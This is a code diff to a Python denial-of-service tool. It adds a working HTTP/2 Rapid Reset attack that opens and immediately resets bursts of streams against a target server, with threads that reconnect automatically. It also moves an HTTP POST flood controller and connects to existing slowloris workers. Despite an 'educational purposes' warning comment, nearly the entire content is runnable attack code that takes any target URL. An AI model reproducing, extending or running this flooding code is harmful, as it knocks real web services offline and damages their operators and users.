@@ -3,7 +3,9 @@
 from scapy.all import *
 from scapy.layers.inet import IP, ICMP, TCP, UDP
 from scapy.layers.dns import DNS, DNSQR
-
+# Add the h2 library to your imports
+import h2.connection
+import h2.events
 
 # ==============================================================================
 # WARNING: This is a Denial of Service (DoS) script for educational purposes.
@@ -272,6 +274,24 @@ def http_post_worker(stop_event, pause_event, target_ip, port, host_header):
             time.sleep(0.5)
 
 
+# --- NEW: HTTP POST Flood Controller ---
+def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150):
+    """Controller for HTTP POST flood attacks."""
+    ips = resolve_to_ipv4(target_url)
+    if not ips: return
+
+    attack_end_time = time.time() + duration
+    for ip in ips:
+        for _ in range(threads):
+            t = threading.Thread(target=http_post_worker, args=(stop_event, pause_event, ip, port, target_url))
+            t.daemon = True
+            t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
+
+
 # --- Corrected and Robust Slowloris Attack Worker ---
 # This version prevents the "UnboundLocalError" by initializing `s` to None.
 def slowloris_worker(stop_event, pause_event, target_ip, port, host_header):
@@ -318,24 +338,6 @@ def slowloris_worker(stop_event, pause_event, target_ip, port, host_header):
             s.close()
 
 
-# --- NEW: HTTP POST Flood Controller ---
-def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150):
-    """Controller for HTTP POST flood attacks."""
-    ips = resolve_to_ipv4(target_url)
-    if not ips: return
-
-    attack_end_time = time.time() + duration
-    for ip in ips:
-        for _ in range(threads):
-            t = threading.Thread(target=http_post_worker, args=(stop_event, pause_event, ip, port, target_url))
-            t.daemon = True
-            t.start()
-
-    while time.time() < attack_end_time and not stop_event.is_set():
-        time.sleep(1)
-    stop_event.set()
-
-
 # --- NEW: Slowloris Attack Controller ---
 def attack_slowloris(target_url, port, duration, stop_event, pause_event, sockets=200):
     """Controller for Slowloris attacks."""
@@ -349,6 +351,100 @@ def attack_slowloris(target_url, port, duration, stop_event, pause_event, socket
             t.daemon = True
             t.start()
 
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
+
+
+# --- NEW: HTTP/2 Rapid Reset Worker ---
+# This is a highly efficient Layer 7 attack that exploits the HTTP/2 stream
+# cancellation feature. It sends a large number of requests and immediately
+# resets them, forcing the server to allocate and then tear down resources
+# for each request, leading to CPU exhaustion.
+def h2_rapid_reset_worker(stop_event, pause_event, target_ip, port, host_header):
+    """Worker thread that performs a rapid reset attack over a single H2 connection."""
+    sock = None
+    try:
+        # Establish a standard TCP connection
+        sock = socket.create_connection((target_ip, port), timeout=4)
+
+        # Set up the H2 connection state machine
+        conn = h2.connection.H2Connection()
+        conn.initiate_connection()
+        sock.sendall(conn.data_to_send())
+
+        # The headers for our rapid-fire requests
+        headers = [
+            (':method', 'GET'),
+            (':authority', host_header),
+            (':scheme', 'https' if port == 443 else 'http'),
+            (':path', '/'),
+            ('user-agent', random.choice(USER_AGENTS)),
+        ]
+
+        # Main loop to continuously send and reset streams
+        while not stop_event.is_set():
+            if pause_event.is_set():
+                time.sleep(1)
+                continue
+
+            try:
+                # In a tight loop, we open a new stream and immediately reset it.
+                # This is the core of the attack.
+                for _ in range(100):  # Send a burst of 100 resets
+                    stream_id = conn.get_next_available_stream_id()
+                    conn.send_headers(stream_id, headers)
+                    conn.reset_stream(stream_id)
+
+                # Send the batch of generated frames to the server
+                sock.sendall(conn.data_to_send())
+
+                # A very brief sleep to prevent this thread from consuming 100% CPU
+                # on a single core just from the Python loop itself.
+                time.sleep(0.01)
+
+            except Exception:
+                # If any error occurs (e.g., server closes connection), break the loop
+                # and the thread will terminate and be restarted by the controller if needed.
+                break
+
+    except Exception:
+        # Pass on any connection or setup errors
+        pass
+    finally:
+        # Ensure the socket is always closed
+        if sock:
+            sock.close()
+
+
+# --- NEW: HTTP/2 Rapid Reset Controller ---
+def attack_h2_rapid_reset(target_url, port, duration, stop_event, pause_event, threads=50):
+    """Controller for HTTP/2 Rapid Reset attacks."""
+    # Note: This attack is so efficient that fewer threads are needed compared to other floods.
+    ips = resolve_to_ipv4(target_url)
+    if not ips: return
+
+    attack_end_time = time.time() + duration
+
+    # We use a nested function to allow threads to restart if they fail
+    def maintain_worker(ip):
+        while not stop_event.is_set():
+            worker_thread = threading.Thread(target=h2_rapid_reset_worker,
+                                             args=(stop_event, pause_event, ip, port, target_url))
+            worker_thread.daemon = True
+            worker_thread.start()
+            worker_thread.join()  # Wait here until the worker thread dies (e.g., connection drop)
+            if not stop_event.is_set():
+                time.sleep(1)  # Wait a moment before reconnecting
+
+    for ip in ips:
+        for _ in range(threads):
+            # Each maintainer thread is responsible for one attack worker
+            maintainer = threading.Thread(target=maintain_worker, args=(ip,))
+            maintainer.daemon = True
+            maintainer.start()
+
+    # Main controller loop to enforce duration
     while time.time() < attack_end_time and not stop_event.is_set():
         time.sleep(1)
     stop_event.set()
